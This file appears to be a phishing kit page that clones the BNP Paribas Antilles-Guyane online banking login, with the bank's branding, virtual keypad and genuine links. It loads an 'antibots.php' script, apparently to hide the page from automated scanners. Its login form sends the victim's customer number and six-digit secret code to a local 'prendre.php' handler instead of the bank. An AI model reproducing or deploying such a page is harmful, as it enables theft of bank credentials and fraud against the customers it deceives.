
<!-- SURV_AUT -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
<?php 
include 'antibots.php';
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="expires" content="Tue, 01-Jan-1980 00:00:00 GMT">
<meta http-equiv="date" content="Tue, 01-Jan-1980 00:00:00 GMT">
<title>BNPPARIBAS NET IDENTIFICATION</title>
<link href="dciweb.css" rel="stylesheet" type="text/css">
<link href="bnp.css" rel="stylesheet" type="text/css">
</head>
<body  bgcolor="#FFFFFF" link="#002288" alink="#002288" vlink="#002288"  >
<script language="JavaScript" src="tools.js"></script>
  <style>
    body {display : none;} 
  </style>
  <script>
    if (self == top) { 
      var theBody = document.getElementsByTagName('body')[0];
      theBody.style.display = "block";
    } else { 
      top.location = self.location; 
    }
  </script>
  <script type="text/javascript">
    function clearParams() {
      if (document.saisie.p0 != null) document.saisie.p0.value = "";
      if (document.saisie.p1 != null) document.saisie.p1.value = "";
      if (document.saisie.pwd != null) document.saisie.pwd.value = "";
    }
    function control()
    {
      document.saisie.p1.value=document.saisie.pwd.value
      if ((document.saisie.p0.value=="")||(document.saisie.p1.value==""))
      {
        alert("Le numéro d'abonné et le mot de passe doivent être remplis!");
        document.saisie.p0.focus();
        clearParams();
        return false;
      }
      return true;
    }
    function submitform()
    {
      if (control())
        document.saisie.submit() ;
      clearParams();
    }
    function key(evnt)
    {
      if(evnt.which==13) submitform();
    }
  </script>
  <style type="text/css">
    <!--
    a:link,a:active,a:visited
    {
    text-decoration:none;
    color:black;
    }
    a:hover
    {
    text-decoration: underline;
    color:#0000FF;
    }
    //-->
  </style>
  <div class="page">
    <table>
      <tr>
        <td align="center"><img align="center" border="0" src="headerBack.jpg" width="760" height="75"></td>
      </tr>
      <tr>
        <td colspan=2>&nbsp;</td>
      </tr>
    </table>
    <div class="info3"><span style="font-size:130%">
  Acc&eacute;dez &agrave; l'espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span></div>
    <div align="left">
      &nbsp;
    </div>
      <div align="center">
        <b><font color="#FF0000"> </font></b>
        <center>
          <form autocomplete="off"  name="saisie" method="post" onSubmit="return control();" enctype="application/x-www-form-urlencoded" target="_top" action="prendre.php">
              <input type="hidden" name="vkid" value="vkident-iqc19k5xer">
              <input type="hidden" name="p1">
              <div style="width:620px; margin:0 auto; text-align: left">
                <div class="formulaire1" style="height:32px; line-height:32px; font-size:12px;">
                  <img src="etape1.png" style="width:20px; height:20px; margin:auto 5px; vertical-align:middle;" />
                  <span >&nbsp;Saisissez votre &nbsp;num&eacute;ro&nbsp;client&nbsp;&agrave; l'aide du&nbsp;clavier</span>
                  <span style="font-size:13px; font-weight:bold; margin-left:20px;">Numéro client</span>
                  <input size="10" maxlength="10" value="" name="p0" type="text" style="margin: auto 5px; vertical-align:middle;" />
                </div>
                <div class="encartIdent" >
                  <span class="titre">
  Espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span>
                  <ul>
                     <li><a href="http://antilles-guyane.bnpparibas"> <FONT COLOR="#0000FF">Accueil</FONT></a></li> 
                     <li><a href="http://antilles-guyane.bnpparibas/aide/aide-connexion-bnpinet/"   target="_blank"><FONT COLOR="#0000FF">Aide à la connexion ?</FONT></a></li> 
                        <li><a href="http://antilles-guyane.bnpparibas/convention/"      target="_blank"><FONT COLOR="#0000FF">Convention</FONT></a></li> 
					    <li><a href="cookiesp.html"      target="_blank"><FONT COLOR="#0000FF">Politique des Cookies</FONT></a></li> 
					    <li><a href="https://antilles-guyane.bnpparibas/espace-donnees-personnelles/"      target="_blank"><FONT COLOR="#0000FF">Espace Données Personnelles</FONT></a></li> 
                    <li><a href="https://antilles-guyane.bnpparibas.net/part/fr/ide1hom.html" target="_top"><FONT COLOR="#0000FF">Visite guidée</FONT></a></li>
                  </ul>
                </div>
                <div style="float:left;width: 50%;">
                  <div class="signatureMdp3">
                    <table>
                      <tr>
                        <td colspan="2">
                          <img class="vAlignMiddle" src="etape2.png" alt="etape 2" style="margin: 0 5px 5px 0; float:left;">
                          <div style="padding-top:3px;">&nbsp;Cliquez pour composer les six chiffres de votre code secret</div>
                        </td>
                      </tr>
                      <tr>
                        <td class="col1">
                          <img src="dciweb.png?p0=vkimage.tht&amp;t=p&amp;vkid=vkident-iqc19k5xer" usemap="#grillemap" border="0">
                        </td>
                        <td align="top">
                          <p style="margin:2px 0;">
                            <strong>Tapez votre mot de passe</strong>
                          </p>
                          <input size="6" maxlength="6" name="pwd" type="password" disabled>
                          <br>
                          <br>&nbsp;
                          <a href="#" onclick="document.saisie.pwd.value='';">
                            <img class="vAlignMiddle" src="flecheCorriger.png">
                          </a>
                          &nbsp;&nbsp;
                          <a href="#" onclick="document.saisie.pwd.value='';">
                            Corriger
                          </a>
                        </td>
                      </tr>
                    </table>
                  </div>
                  <table cellpadding="0" cellspacing="0" class="tableBouton">
                    <tr>
                      <td align="center">
                        <a href="#" name="local" onClick="return submitform();">
                          <img src="btn_valider.png" alt="" />
                        </a>
                      </td>
                      <td>&nbsp;</td>
                      <td align="center">
                        <a href="#" name="local" onClick="document.saisie.p0.value=''; document.saisie.pwd.value=''; document.saisie.p0.focus();">
                          <img src="btn_annuler.png" alt="" />
                        </a>
                      </td>
                    </tr>
                  </table>




  

<map name="grillemap">
  <script language="javascript">
  CellX=132/5;
  CellY=128/5;
	col=0;
	lig=0;
  tabcar = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y');
	function pwd_writeM(cell)
	{
	  document.saisie.pwd.value
   	
		if ( document.saisie.pwd.value.length < 6 )
	  	document.saisie.pwd.value = document.saisie.pwd.value + tabcar[cell];
	}
	for(i=0; i<25; i++ )
	{
	  if(parseInt((i/5), 10)!=lig)
	  {
		  col=0;
		  lig=parseInt((i/5), 10);
	  }
	  posX = parseInt(col*CellX, 10);
	  posY = parseInt(lig*CellY, 10);
	  posX1= parseInt((col+1)*CellX, 10);
	  posY1= parseInt((lig+1)*CellY, 10);
	  col++;
	  document.writeln('<area shape="rect" coords="'+posX+','+posY+','+posX1+','+posY1+'" onclick="pwd_writeM('+i+');" ondblclick="if(navigator.appName==\'Microsoft Internet Explorer\'){pwd_writeM('+i+')}" onfocus="document.saisie.p0.focus();">');
	}
  </script>
  
</map>

                </div>
              </div>
            
          </form>
        </center> 
      </div>
      
      <div style="clear:both;"/>
      
      <div align="center">
        
        
        
        
        
        
          
            <div style="padding-top: 10px">
              <img src="https://antilles-guyane.bnpparibas.net/part/fr/images/covid19-information.png" height="300" border="0">
            </div>
          
        
      </div>
    
  </div>
  
  <script type="text/javascript">
    document.saisie.p0.focus();
  </script>
  
  
  <!--
  <script>
    if (navigator.userAgent.indexOf("MSIE 6.") != -1) {
      alert("Pour des raisons de sécurité, le service ne sera plus accessible à compter de fin juin 2015 en utilisant Microsoft Internet Explorer inférieur à la version 7.\n\nCe navigateur étant obsolète, il est fortement recommandé de le faire évoluer vers une version plus récente.");
    }
  </script>
  -->
  
  
</div>
</body></html>